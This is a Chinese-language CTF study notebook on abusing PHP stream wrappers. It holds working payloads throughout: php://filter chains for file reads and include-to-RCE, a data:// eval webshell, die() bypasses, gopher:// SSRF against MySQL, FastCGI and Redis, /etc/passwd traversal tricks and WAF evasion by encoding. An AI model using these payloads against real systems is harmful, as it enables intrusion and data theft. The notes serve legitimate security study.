- [PHP官方文档](https://www.php.net/manual/en/wrappers.php)
- # `php://`
  id:: 66363328-deca-4ae5-a4d2-762a1ecc9636
	- 各种编码的加解密
		- ```
		  base64编码，读取文件：
		  php://filter/read=convert.base64-encode/resource=
		  base64解码，读取文件：
		  php://filter/read=convert.base64-decode/resource=
		  base64解码，写入文件：
		  php://filter/write=convert.base64-decode/resource=
		  rot13编码
		  php://filter/write=string.rot13/resource=
		  zlib压缩
		  php://filter/zlib.inflate/resource=
		  ```
	- include无写入文件RCE
	  id:: 63bc02d6-ea56-4c2a-a494-0cb277531dba
		- 通过错误的编码转换，我们可以在文件内容的开头加入某些字符，这样我们就可以在文件的开头写入任意内容，并实现RCE
		- [参考](https://tttang.com/archive/1395/)
		- [Payload生成](https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT)
		  id:: 66b4eb0a-b8af-4977-a90e-e56b3cf2986e
		- 如果是`include_once`或者`require_once`那可能要配合 ((636665b7-cd42-4bd2-a685-f5e5cc4f5ec7))
	- 让php崩溃，从而让临时文件留在/tmp中
	  id:: 636665b7-767d-440c-8482-bb5e1dc0933c
		- `php://filter/string.strip_tags/resource=/etc/passwd`
	- 让`include_once`和`require_once`失效：
	  id:: 636665b7-cd42-4bd2-a685-f5e5cc4f5ec7
		- `php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/etc/passwd`
	- isset函数支持php伪协议
	- 绕开死亡`die`
		- 某些题目会在文件的开头加入类似`<?php die();`的内容，让我们无法正常写入webshell, 我们可以使用base64解码或者其他方式破坏掉前面的`die`
		- `php://filter/write=string.strip_tags|convert.base64-decode/resource=`
		- `convert.iconv.UCS-2LE.UCS-2BE`可以用于两两交换字符
	- php在解析伪协议时会先urldecode伪协议，所以可以使用二次编码绕过WAF
	  id:: 64673efa-c544-4ad7-9b9b-920b148d0b26
	- 基于filter报错进行读取文件：[[CTFWEB/PHP/基于PHP伪协议报错实现文件读取]]
	- 利用编码转换在文件内容前后加上字符
		- https://www.ambionics.io/blog/wrapwrap-php-filters-suffix
		- 可以利用其输出包含文件内容的JSON
	- 所有filter
		- ```php
		  zlib.*
		  convert.iconv.*
		  string.rot13
		  string.toupper
		  string.tolower
		  string.strip_tags
		  convert.base64-encode
		  convert.base64-decode
		  convert.quoted-printable-encode
		  convert.quoted-printable-decode
		  consumed
		  dechunk
		  ```
- # `data://`
	- 单纯表示某个内容，比如：`data://text/plain,123`读取出来的内容就是`123`
	- include无写入文件RCE
		- `data://text/plain,<?php eval($_POST['data']);?>`
	- base64
		- `data://text/plain;base64,`
	- php中也可以是`data:xxx`
		- [[CTFWEB/WP/Phuck2]]
	- `data://`其中的`text`可以换成`localhost`，绕过`parse_url`
	  id:: 66adf55c-36a2-468b-81db-ee02adcdce2d
		- 例题: ((66adf65b-9144-44e3-b41e-37b0fd38d504))
		- ```php
		  $f = "data://localhost/plain,123";
		  $s = parse_url($f); # .host == "localhost"
		  var_dump(file_get_contents($f)); # "123"
		  ```
- # `gopher://`
  id:: 62f27746-a352-41d4-b76d-63fc1f7c9e4f
	- `gopher://127.0.0.1:9000/_xxx`
		- 其中xxx是（URL编码后的）TCP发送的数据
	- 打SSRF
		- 打无密码MySQL
			- 只需要无密码用户的用户名即可执行任意SQL指令
		- 打FastCGI
			- 只需要一个存在主机上文件的路径就可以执行任意Shell指令
		- 可以打：`mysql, postgresql, fastcgi, redis, smtp, zabbix, pymemcache, rbmemcache, phpmemcache, dmpmemcache`
	- Payload可以用 ((62f14125-43fc-4da5-b83f-4d56aa1d2157)) 生成
- # `phar://`
	- 读取某个phar压缩包中的文件
	- `phar://a.phar/a.txt`
	- [[CTFWEB/PHP/Phar]]
	- 从PHP 8.0版本（发布于2020年）开始，`phar://`不再反序列化元数据
	  id:: 66a359e7-00fa-407c-93ab-64606e9f1637
- # `file://`
	- 表示文件，如`file:///etc/passwd`
	- `file://`除了直接写绝对路径，还可以写`file://<ip-or-domain>/<path>`
	  id:: 65b3d87d-c0d2-45b0-8736-6cdec74a9406
		- 也就是说支持`file://localhost/etc/passwd`的格式
		- 如果ip或域名不是本机则会使用ftp进行连接并读取文件，但是貌似不能带端口
- # `dict://`
	- 发送TCP数据，感觉不如`gopher://`
- # `glob://`
	- 读取目录，后面接上Linux的glob表达式
	- {{embed [[CTFWEB/PHP/目录读取]]}}
- 另：
	- java 的`file://`可以读取目录
	- 能用`file://`的地方有时可以不用`file://`, 直接读取
		- 比如`file:///etc/passwd`和`/etc/passwd`
- 其他
	- 有关file_get_contents()函数的一个trick，可以看作是SSRF的一个黑魔法，当PHP的 file_get_contents() 函数在遇到不认识的伪协议头时候会将伪协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。
		- ```
		  httpsssss://../../../../../../etc/passwd
		  httpsssss://abc../../../../../../etc/passwd
		  ```
	- 在很多时候伪协议都是支持URL编码的，可以用来绕过关键字检测